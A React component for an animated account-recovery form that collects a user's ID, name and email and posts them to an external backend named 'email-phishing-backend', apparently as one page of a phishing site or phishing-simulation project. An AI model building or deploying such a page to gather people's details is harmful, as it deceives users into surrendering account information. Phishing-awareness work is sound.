/* eslint-disable no-unused-vars */
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import axios from "axios";
import logo from '../assets/logo.jpeg';
import '../styles/App.css';

export default function Recovery() {
  const [detail, setDetail] = useState({ UserID: "", name: "", email: "" });
  const navigate = useNavigate();
  const [error, setError] = useState({ UserID: false, name: false, email: false });

  function handleChange(e) {
    const { name, value } = e.target;
    setDetail({ ...detail, [name]: value });
    setError({ ...error, [name]: !value });
  }

  async function handleNext() {
    const { UserID, name, email } = detail;
    if (!UserID || !name || !email) {
      setError({ UserID: !UserID, name: !name, email: !email });
      return;
    }

    try {
      const response = await axios.post("https://email-phishing-backend.onrender.com/api/recovery", detail);
      console.log("Response:", response.data);
      navigate("/recovery2");
    } catch (error) {
      console.error("Error saving user details:", error);
    }
  }

  return (
    <div className="recoveryContainer flex justify-center items-center h-screen bg-gray-100">
      <motion.div 
        initial={{ x: 200, opacity: 0 }} 
        animate={{ x: 0, opacity: 1 }}  
        transition={{ duration: 0.6, ease: "easeOut" }} 
        className="recoveryContainerChild bg-white p-8 rounded-lg shadow-lg w-96 text-center"
      >
        <div className="innerChild">
          <div className="images">
            <motion.img 
              src={logo} 
              alt="Logo"
              initial={{ scale: 0.8, opacity: 0 }} 
              animate={{ scale: 1, opacity: 1 }} 
              transition={{ duration: 0.5 }}
              className="mx-auto mb-4"
            />
          </div>

          <div className="enterDetail">
            <motion.p className="text-gray-600 text-sm mb-4">
              To continue, enter your <strong className="text-red-500">*</strong> UserID, Name, and Email
            </motion.p>

            <motion.input
              type="text"
              placeholder="Enter UserID *"
              onChange={handleChange}
              name="UserID"
              value={detail.UserID}
              required
              className={`w-full px-4 py-2 border rounded mb-2 ${error.UserID ? "border-red-500" : "border-gray-300"}`}
            />
            {error.UserID && <p className="text-red-500 text-xs">UserID is required</p>}

            <motion.input
              type="text"
              placeholder="Enter Username *"
              onChange={handleChange}
              name="name"
              value={detail.name}
              required
              className={`w-full px-4 py-2 border rounded mb-2 ${error.name ? "border-red-500" : "border-gray-300"}`}
            />
            {error.name && <p className="text-red-500 text-xs">Name is required</p>}

            <motion.input
              type="email"
              placeholder="Enter Email *"
              onChange={handleChange}
              name="email"
              value={detail.email}
              required
              className={`w-full px-4 py-2 border rounded mb-2 ${error.email ? "border-red-500" : "border-gray-300"}`}
            />
            {error.email && <p className="text-red-500 text-xs">Email is required</p>}
          </div>
        </div>

        <motion.div className="button mt-4">
          <button 
            type="button" 
            onClick={handleNext}
            disabled={!detail.UserID || !detail.name || !detail.email}
            className={`w-full py-2 rounded-lg font-semibold transition-all 
              ${!detail.UserID || !detail.name || !detail.email 
                ? "bg-gray-400 cursor-not-allowed" 
                : "bg-blue-500 hover:bg-blue-600 text-white"}
            `}
          >
            Next
          </button>
        </motion.div>
      </motion.div>
    </div>
  );
}